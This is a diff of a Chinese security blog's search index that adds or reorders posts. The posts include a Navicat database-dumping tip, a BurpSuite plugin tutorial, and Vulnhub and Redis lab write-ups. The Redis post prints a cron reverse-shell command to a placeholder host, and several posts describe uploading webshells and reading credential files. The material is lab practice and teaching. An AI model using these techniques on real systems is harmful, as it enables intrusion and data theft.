@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Navicat脱裤]]></title>
+    <url>%2F2019%2F01%2F31%2F%E4%BD%BF%E7%94%A8navicat%E6%9D%A5%E8%84%B1%E8%A3%A4%E5%90%A7!%2F</url>
+    <content type="text"><![CDATA[看到有使用Navicat脱裤的，做下记录 准备工作Navicat目录下的PHP文件 将PHP文件放在web目录打开后的效果 正式开始在本地打开Navicat，新建连接里选择http,输入目标地址在常规里主机名写localhost,在输入账号密码即可快乐的脱裤了]]></content>
+      <categories>
+        <category>Tips</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[BurpSuite 插件开发(上)]]></title>
     <url>%2F2019%2F01%2F25%2FBurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%2F</url>
     <content type="text"><![CDATA[最近一直在挖洞，经常要用到BurpSuite，而Burp 上的一下插件不太好使，就想要自己开发一些插件，在网上看了一些资料，这里来写一个简单的插件吧！ 开始前的准备开发所需要的SDK 包都可以在 Burp — Extender — APIs 处导出 由于所有接口类都有一个 package burp所以需要建一个burp包，把所有接口类导入进去，然后新建BurpExtender.java,代码都写到里面 本篇中用到的Burp APIIBurpExtender这是一个必须要实现的接口 需要实现的方法 1void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) Demo 1234567package burp;public class BurpExtender implements IBurpExtender&#123; @Override public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)&#123; // TODO here &#125;&#125; ITab此接口用于自定义的标签页 1234567891011121314//实现 ITab 接口的 getTabCaption 方法 // 此方法用于获取自定义标签的标题文本@Overridepublic String getTabCaption() &#123; // TODO Auto-generated method stub return &quot;Burp 标签测试&quot;;&#125;// 实现 ITab 接口的 getUiComponent 方法// Burp 调用此方法获取自定义标签页显示的组件@Overridepublic Component getUiComponent() &#123; // TODO Auto-generated method stub return jPanelMain;&#125; IBurpExtenderCallbacks Burp Suite 利用此接口向扩展中传递了许多回调方法，这些回调方法可被用于在 Burp 中执行多个操作。当扩展被加载后，Burp 会调用registerExtenderCallbacks() 方法，并传递一个 IBurpExtenderCallbacks 的实例。 方法有很多，具体的就看文档咯 demo 12345678package burp;public class BurpExtender implements IBurpExtender&#123; @Override public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)&#123; // TODO Auto-generated method stub callbacks.setExtensionName("BurpExtender");//设置扩展名为“BurpExtender” &#125;&#125; IExtensionHelpers此接口提供了很多常用的辅助方法，这些扩展可用于协助处理Burp扩展所产生的各种常见任务，扩展可以通过调用IBurpExtenderCallbacks.getHelpers 获得此接口的实例。 Hello Burp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package burp;//实现的类名必须为“BurpExtender”import java.awt.Component;import java.awt.event.MouseAdapter;import java.awt.event.MouseEvent;import java.io.PrintWriter;import javax.swing.JButton;import javax.swing.JPanel;import javax.swing.SwingUtilities; // 所有的扩展必须实现IBurpExtender接口public class BurpExtender implements IBurpExtender,ITab&#123; public PrintWriter stdout; public IExtensionHelpers hps; //IExtensionHelpers提供了很多常用的辅助方法 public IBurpExtenderCallbacks cbs; public JPanel jPanelMain; //实现 ITab 接口的 getTabCaption 方法 // 此方法用于获取自定义标签的标题文本 @Override public String getTabCaption() &#123; // TODO Auto-generated method stub return "Burp 标签测试"; &#125; // 实现 ITab 接口的 getUiComponent 方法 // Burp 调用此方法获取自定义标签页显示的组件 @Override public Component getUiComponent() &#123; // TODO Auto-generated method stub return jPanelMain; &#125; //必须提供的默认构造器 //在这里写主要代码噢 @Override public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) &#123; // TODO Auto-generated method stub callbacks.setExtensionName("BurpExtender");//设置扩展名为“BurpExtender” this.hps = callbacks.getHelpers();//IBurpExtenderCallbacks.getHelpers() 获得此接口的实例。 this.cbs = callbacks; //getStdout()此方法用于获取当前扩展的标准输出流。扩展应该将所有输出写入此流，允许Burp用户配置在UI中处理输出的方式。 this.stdout = new PrintWriter(callbacks.getStdout(), true); this.stdout.println("hello burp!");//插件被加载的时候输出 SwingUtilities.invokeLater(new Runnable() &#123; @Override public void run() &#123; // TODO Auto-generated method stub jPanelMain = new JPanel(); JButton jButton = new JButton("Hello Burp"); jButton.addMouseListener(new MouseAdapter() &#123; @Override public void mouseClicked(MouseEvent e)&#123; stdout.println("Hello Burp"); &#125; &#125;); // 将按钮添加到 主面板 jPanelMain 中. jPanelMain.add(jButton); // 设置自定义组件并添加标签 cbs.customizeUiComponent(jPanelMain); cbs.addSuiteTab(BurpExtender.this); &#125; &#125;); &#125; &#125;]]></content>
@@ -104,18 +116,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Vulnhub JJS-CTF]]></title>
-    <url>%2F2018%2F10%2F05%2FVulnhub-JJS-CTF%2F</url>
-    <content type="text"><![CDATA[Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags. 这个靶机中存在五个flag,平均1.5小时就可以找到它们。 0x00 主机发现使用Nmap进行扫描 1nmap -sS 192.168.1.0/24 发现目标机，并且其开放了22，与80端口 0x01 Web发现网站存在robots.txt文件 一番测试后发现只有admin_area页面和flag页面有内容，其他的也只有uploaded_files目录可以访问 admin_area flag 拿到第一个flag 扫目录发现flag.txt是forbidden，先不管它，其它的也没有什么发现，又回到了admin_area界面，怎么看都感觉是掩耳盗铃一般，查看源代码， 果真有收获。 第二个flag与账号密码就拿到手了 登陆后是一个上传界面，随便上传个一句话，居然成功了 0x02 Linux拿菜刀连接一下，连接成功 在HTML目录下有一个hint文件 得到第三个flag的同时有了下一个flag的线索，找到technawi用户的密码 使用命令 1find / -user 'technawi' 2&gt;/dev/null 找到所有属于technawi，且当前用户拥有权限的文件 众多文件中数这个credentials.txt最可疑 cat打开 第四个flag，以及technawi账户的密码就拿到手了，剩下的一个flag估计就在网站根目录下的flag.txt下了 前期端口扫描的时候知道了该主机存在SSH，所以用xshell连接，账号密码就是上面的，连接后 1cat /var/www/html/flag.txt 完工 0x03 总结这一个算是比较简单的题目，整个做下来基本上很流畅，Linux上的命令还不太熟悉，以后要多加练习。]]></content>
-      <categories>
-        <category>Challenge</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[VulnHub-LazySysAdmin]]></title>
     <url>%2F2018%2F10%2F05%2FVulnHub-LazySysAdmin%2F</url>
     <content type="text"><![CDATA[主要考察信息收集 0x01 前期试探使用nmap进行扫描,发现存在如下端口 可以做出简单的分析 端口 作用 22 SSH登陆 80 Web应用 445 共享文件 3306 MySql 使用御剑扫描下Web应用存在PHPMyAdmin与WordPress，和robots.txt文件robots.txt访问后发现没有多大用处,phpmyadmin与wordpress没有账号密码也并不好突破，不过在wordpress处获得了一个可能的账号togie 0x02 突破点Find因为其开放了445端口，所以用enum4linux尝试进行扫描可以看到share是OK的 windows下获取共享资源1net use k: \\10.10.10.132\share$ linux下获取共享资源1mount -t cifs -o username='',password='' //10.10.10.132/share$ /mnt 对得到文件进行查看在deets.txt文件中发现一个密码 再加上刚开始得到的一个可能的账号，首先尝试了下ssh连接没想到直接成功了,切换到root账户，完成 0x03 Web渗透0x01 WebShell这样就直接拿到Shell了？多少有些无趣，看了下wordpress的config文件找到了数据库的账号和密码记得刚才扫的有phpmyadmin目录，登陆成功，不过权限太低了，只好放弃尝试下登陆wordpress,没想到还是数据库的账号密码登陆上去了在404界面写入反弹shell得到WebShell 0x02 提权开坑待填…… 0x04 总结总的来说是一个比较简单的challange,基本上只要掌握了enum4linux以及获取共享资源的方法就可以，继续加油。]]></content>
@@ -125,6 +125,18 @@
       <tags>
         <tag>Web</tag>
         <tag>CTF</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Vulnhub JJS-CTF]]></title>
+    <url>%2F2018%2F10%2F05%2FVulnhub-JJS-CTF%2F</url>
+    <content type="text"><![CDATA[Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags. 这个靶机中存在五个flag,平均1.5小时就可以找到它们。 0x00 主机发现使用Nmap进行扫描 1nmap -sS 192.168.1.0/24 发现目标机，并且其开放了22，与80端口 0x01 Web发现网站存在robots.txt文件 一番测试后发现只有admin_area页面和flag页面有内容，其他的也只有uploaded_files目录可以访问 admin_area flag 拿到第一个flag 扫目录发现flag.txt是forbidden，先不管它，其它的也没有什么发现，又回到了admin_area界面，怎么看都感觉是掩耳盗铃一般，查看源代码， 果真有收获。 第二个flag与账号密码就拿到手了 登陆后是一个上传界面，随便上传个一句话，居然成功了 0x02 Linux拿菜刀连接一下，连接成功 在HTML目录下有一个hint文件 得到第三个flag的同时有了下一个flag的线索，找到technawi用户的密码 使用命令 1find / -user 'technawi' 2&gt;/dev/null 找到所有属于technawi，且当前用户拥有权限的文件 众多文件中数这个credentials.txt最可疑 cat打开 第四个flag，以及technawi账户的密码就拿到手了，剩下的一个flag估计就在网站根目录下的flag.txt下了 前期端口扫描的时候知道了该主机存在SSH，所以用xshell连接，账号密码就是上面的，连接后 1cat /var/www/html/flag.txt 完工 0x03 总结这一个算是比较简单的题目，整个做下来基本上很流畅，Linux上的命令还不太熟悉，以后要多加练习。]]></content>
+      <categories>
+        <category>Challenge</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
         <tag>Linux</tag>
       </tags>
   </entry>
@@ -165,18 +177,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[redis未授权访问]]></title>
-    <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
-    <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>redis</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[Vulnhub FristiLeaks]]></title>
     <url>%2F2018%2F10%2F02%2FVulnhub-FristiLeaks%2F</url>
     <content type="text"><![CDATA[A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc.. 0x01 开始前的准备环境下载https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrenthttps://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova 配置环境VMware users will need to manually edit the VM’s MAC address to: 08:00:27:A5:A6:76也就是把VMware的MAC地址调为08:00:27:A5:A6:76，之后开启虚拟机即可 0x02 扫描首先使用Nmap进行扫描 只有80端口开启，nmap扫描下80端口 可以看到robots文件存在，并有三个目录存在 访问192.168.1.5，除了一张图片，基本上没有什么了 robots.txt里的三个页面打开后是同一张图片，看来是毫无用处了，用御剑扫了下目录发现images文件夹,基本没用 0x03 获得Shell最后回到主页的图片上来，fristi，题目好像也有这个，于是试了下fristi 弱口令失败，看下源代码想找找有没有什么东西 Great 先将base64解码，出现PNG字样，用base64转图片 得到一串字符，尝试登陆： 正好第一处tip中有个名字，尝试登陆 进入上传页面 在namp扫描时发现服务器为Apache Linux所以尝试下多重后缀名 上传成功，用菜刀连接 0x04 提升权限正在骑马赶来的路上……]]></content>
@@ -186,6 +186,18 @@
       <tags>
         <tag>Web</tag>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[redis未授权访问]]></title>
+    <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
+    <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>redis</tag>
       </tags>
   </entry>
   <entry>
